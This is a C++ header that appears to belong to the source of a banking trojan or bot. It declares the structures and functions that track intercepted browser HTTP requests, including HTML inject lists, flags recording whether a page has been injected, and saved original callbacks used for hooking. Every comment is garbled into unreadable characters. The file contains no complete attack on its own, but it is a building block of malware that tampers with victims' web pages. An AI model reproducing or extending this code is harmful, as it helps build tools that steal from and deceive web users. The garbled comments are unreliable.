
#ifndef RequestsH
#define RequestsH
//---------------------------------------------------------------------------

#include <windows.h>

#include "BotClasses.h"
#include "BotHTTP.h"
#include "BotClasses.h"




//********************************************************************
//   ������ ������ �����������  ������ ��������
//********************************************************************
typedef void(*TRequestEvent)(LPVOID);

typedef struct TRequestListRec
{
	PList Items;                       // ����� ���������
	LPCRITICAL_SECTION Lock;           // ���������� ������
	TRequestEvent OnInitializeExtData;
	TRequestEvent OnFreeExtData;
} *PRequestList;


typedef struct TRequestRec
{
	LPVOID Owner;        // ������������� ��������� �������
	THTTPMethod Method;  // �������� �������� ������
	PCHAR URL;           // ����� ����� � �������� �������������� ������
	bool IsSecure;        // ���. ���� - ������� ����������� ����������
	PCHAR Optional;      // ���� ������ �������
	PCHAR ContentType;   // ��� ������������ ���������
    DWORD ContentLength; // ������ ����������� ������
	bool SupportPostData;// ������� ��������������� ��������� ����

	LPBYTE Buffer;       // ����� �������� ������
	DWORD BufferSize;    // ������ ������ �������� ������
	DWORD ReadedSize;    // ��������� ����


	DWORD SavedSize;
	DWORD SaveReturned;

	DWORD Position;      // ������� ������ ������
	bool FileReaded;     // ������� ����, ��� ���� ��������
    bool ConnectionClosed;// ���������� � �������� �������

	bool IsInject;       // ������� ������� �������� ��� �������
	PList Injects;       // ������ �������� (�������� ���� PHTMLInject)
	bool Injected;       // ������� ����, ��� ������ ��� ���������

	HANDLE Event;         // ������� ��������� ����� �������� ����� �� ��������� ������� �����������
	HANDLE AllowClose;    // ������� ��������� ����� ����� �������� ����������

	LPVOID OldCallback;	 // ��������� �� ���������� ����� �������� �����  (��� �������� ����������)
	LPVOID OldContext;   //  ��������� �� ���������� �������� �������� ���������� (��� �������� ����������)

	bool DocumentNeedCached; // ������� ����, ��� �������� ���������� �������� � ���

	PMemBlockList ReceiveList; // ������ ����������� ������
	PMemBlock ReceiveBuf;      // ����� ��������

	bool FirstHandled;   // ������� ��������� ������ ������� ������ (��� IE)
	DWORD Entry;
	PCHAR CacheFileMask; // ��������� ����� ����� ����� ����. ������������ ���
	                     // ���������� ����������� ���������� � ������������ ��������
	//------------------------------------------//

	LPVOID ExtData;     // �������������� ������ �������
	DWORD Flags;        // �������������� �����
	bool HeaderHandled; // ������� ������������� ���������
    DWORD HeaderSize;   // ������ ��������� ������
	//
	PRequestList List; // ������ �������� ����������� �������
} *PRequest;


typedef bool (*TRequestEnumMethod)(PRequest Request, LPVOID Data);


//----------------------------------------------------------------------------
//  Request - ����� ������� ��� ������ � ���������
//----------------------------------------------------------------------------
namespace Request
{
	// ������ ������ ��������
	PRequestList CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData);

	// ���������� ������ ��������
	void FreeList(PRequestList List);

	// �������� ������. ���� ������ ��� ��������� Owner ����������, �� �����
	// ��������� ��������� �� ����. ��������� ���������
	// Existed ���� ������ ������ ����������� �� ������ ��  �����
	PRequest Add(PRequestList List, LPVOID Owner, bool *Existed = NULL);

	// ����� ������ ��� ���������
	PRequest Find(PRequestList List, LPVOID Owner);

	// ������� ������
	DWORD Delete(PRequestList List, LPVOID Owner);

	// �������� ������
	void Clear(PRequest R);

	// ���������������� ������ ��� �������� ���������
	void InitializeReceiveData(PRequest R);

	// ������� �������� ����������� ������ � ����� �������
	// � ����������� ���������� ��� �������� ���������
	void CloseReceiveData(PRequest R);


	// �������� ��������� ������ ������
	DWORD GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf);

	// ���������� ������ �������
	void SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size);

	// ����� �������� ���� �������� ������
    void EnumRequests(PRequestList Requests, TRequestEnumMethod Method, LPVOID Data);


	void inline Lock(PRequestList List);
	void inline Unlock(PRequestList List);
}



//********************************************************************
//  ������� ��� ����������� ������ ��������
//********************************************************************

class TRequest;


class TRequestList : public TBotCollection
{
private:
	TRequest* DoFind(LPVOID Handle);
protected:
	virtual TRequest* CreateItem();
public:
	TRequestList();
	~TRequestList();

	TRequest* Find(LPVOID Handle); // ������� ���� ������ �� ��� ��������������
	TRequest* Add(LPVOID Handle);  // ������� ��������� ������
};


class TRequest : public TBotCollectionItem
{
private:
	LPVOID FHandle;
	int    FRefCount;

	friend class TRequestList;
public:
	TRequest(TRequestList* Owner);
	~TRequest();

    LPVOID inline Handle() { return FHandle; }
};

//---------------------------------------------------------------------------
#endif
